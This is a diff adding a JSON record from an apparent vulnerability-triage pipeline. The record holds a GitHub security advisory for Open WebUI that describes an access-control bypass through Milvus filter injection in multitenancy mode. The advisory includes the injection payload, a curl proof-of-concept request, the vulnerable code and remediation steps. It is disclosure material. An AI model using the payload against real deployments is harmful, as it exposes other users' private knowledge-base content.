@@ -1,0 +1,58 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/98734964?v=4\", \"events_url\": \"https://api.github.com/users/0xEr3n/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/0xEr3n/followers\", \"following_url\": \"https://api.github.com/users/0xEr3n/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/0xEr3n/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/0xEr3n\", \"id\": 98734964, \"login\": \"0xEr3n\", \"node_id\": \"U_kgDOBeKTdA\", \"organizations_url\": \"https://api.github.com/users/0xEr3n/orgs\", \"received_events_url\": \"https://api.github.com/users/0xEr3n/received_events\", \"repos_url\": \"https://api.github.com/users/0xEr3n/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/0xEr3n/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/0xEr3n/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/0xEr3n\", \"user_view_type\": \"public\"}}, {\"type\": \"remediation_developer\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/27028174?v=4\", \"events_url\": \"https://api.github.com/users/Classic298/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/Classic298/followers\", \"following_url\": \"https://api.github.com/users/Classic298/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/Classic298/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/Classic298\", \"id\": 27028174, \"login\": \"Classic298\", \"node_id\": \"MDQ6VXNlcjI3MDI4MTc0\", \"organizations_url\": \"https://api.github.com/users/Classic298/orgs\", \"received_events_url\": \"https://api.github.com/users/Classic298/received_events\", \"repos_url\": \"https://api.github.com/users/Classic298/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/Classic298/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/Classic298/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/Classic298\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-54019\", \"cvss\": {\"score\": 6.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 6.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-862\", \"name\": \"Missing Authorization\"}, {\"cwe_id\": \"CWE-943\", \"name\": \"Improper Neutralization of Special Elements in Data Query Logic\"}], \"description\": \"# RAG ACL Bypass in Milvus Multitenancy Mode\\n\\n## Summary\\n\\nThis is a bypass of the fix for:\\n\\n- GHSA-h36f-rqpx-j5wx\\n- CVE-2026-44560\\n- \\\"Unauthorized File and Knowledge Base Content Access via RAG Vector Search\\\"\\n\\nOpen WebUI added collection-level ACL checks, but the patch can still be bypassed when Milvus multitenancy mode is enabled. The ACL allows unknown non-KB collection names as legacy/ephemeral collections. In Milvus multitenancy mode, that user-controlled collection name becomes a `resource_id` and is interpolated into a Milvus expression without escaping.\\n\\nAn authenticated non-admin user can query:\\n\\n```text\\nx' or resource_id != '' or resource_id == 'x\\n```\\n\\nThis passes the Open WebUI ACL as an unknown collection, but Milvus evaluates:\\n\\n```text\\nresource_id == 'x' or resource_id != '' or resource_id == 'x'\\n```\\n\\nThat returns private knowledge-base chunks belonging to other users.\\n\\n## Affected Configuration\\n\\nTested on:\\n\\n```text\\nOpen WebUI: v0.9.5, commit 3660bc00f\\nVECTOR_DB=milvus\\nENABLE_MILVUS_MULTITENANCY_MODE=true\\n```\\n\\nThis is **not a default-vector-store issue**. It affects **production deployments using Milvus multitenancy.**\\n\\n## Impact\\n\\nAn authenticated low-privilege user can read private RAG / knowledge-base content they do not have access to. No victim interaction is required.\\n\\n## Root Cause\\n\\nACL permits unknown collection names:\\n\\n```python\\n# backend/open_webui/retrieval/utils.py\\nelif not await Knowledges.get_knowledge_by_id(name):\\n    validated.add(name)\\n```\\n\\nMilvus multitenancy then treats the same name as `resource_id` and builds unsafe expressions:\\n\\n```python\\n# backend/open_webui/retrieval/vector/dbs/milvus_multitenancy.py\\nexpr=f\\\"{RESOURCE_ID_FIELD} == '{resource_id}'\\\"\\n```\\n\\nAffected paths include:\\n\\n```text\\nPOST /api/v1/retrieval/query/collection\\nPOST /api/v1/retrieval/query/doc\\n```\\n\\n## PoC\\n\\nRequest:\\n\\n```bash\\ncurl -s -X POST \\\"$TARGET/api/v1/retrieval/query/collection\\\" \\\\\\n  -H \\\"Authorization: Bearer $ATTACKER_TOKEN\\\" \\\\\\n  -H \\\"Content-Type: application/json\\\" \\\\\\n  --data-binary @- <<'JSON'\\n{\\n  \\\"collection_names\\\": [\\n    \\\"x' or resource_id != '' or resource_id == 'x\\\"\\n  ],\\n  \\\"query\\\": \\\"anything\\\",\\n  \\\"k\\\": 10,\\n  \\\"hybrid\\\": false\\n}\\nJSON\\n```\\n\\nActual result: private chunks from other users' knowledge collections are returned.\\n\\nExpected result: request should be rejected with 403 or return no unauthorized content.\\n\\n## Remediation\\n\\n1. Do not allow arbitrary unknown collection names in user-controlled RAG query endpoints.\\n2. Escape or parameterize Milvus expression values before building filters.\\n3. Reject collection names containing quotes/control characters unless they match a known internal format.\\n4. Add a regression test for this payload in Milvus multitenancy mode:\\n\\n```text\\nx' or resource_id != '' or resource_id == 'x\\n```\", \"epss\": {\"percentage\": 0.00281, \"percentile\": 0.19796}, \"ghsa_id\": \"GHSA-p5cp-r7rg-qpxc\", \"github_reviewed_at\": \"2026-06-17T17:57:43Z\", \"html_url\": \"https://github.com/advisories/GHSA-p5cp-r7rg-qpxc\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-p5cp-r7rg-qpxc\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-54019\"}], \"nvd_published_at\": null, \"published_at\": \"2026-06-17T17:57:43Z\", \"references\": [\"https://github.com/open-webui/open-webui/security/advisories/GHSA-p5cp-r7rg-qpxc\", \"https://github.com/advisories/GHSA-p5cp-r7rg-qpxc\"], \"repository_advisory_url\": \"https://api.github.com/repos/open-webui/open-webui/security-advisories/GHSA-p5cp-r7rg-qpxc\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/open-webui/open-webui\", \"summary\": \"Open WebUI: RAG ACL Bypass in Milvus Multitenancy Mode\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-17T17:57:44Z\", \"url\": \"https://api.github.com/advisories/GHSA-p5cp-r7rg-qpxc\", \"vulnerabilities\": [{\"first_patched_version\": \"0.9.6\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"open-webui\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 0.9.5\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-p5cp-r7rg-qpxc",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "open-webui: <= 0.9.5"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-44560",
+      "CVE-2026-54019"
+    ],
+    "cvss_score": 6.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "open-webui"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-20T19:51:58.523932Z",
+  "provenance": {
+    "content_sha256": "1713c981df7a5d4ad449310e27e180903df42e7069fc8d1aa4e818336da5dfed",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-06-17T17:57:43Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-p5cp-r7rg-qpxc",
+  "status": "active",
+  "title": "Open WebUI: RAG ACL Bypass in Milvus Multitenancy Mode",
+  "updated_at": "2026-06-17T17:57:44Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-p5cp-r7rg-qpxc"
+}
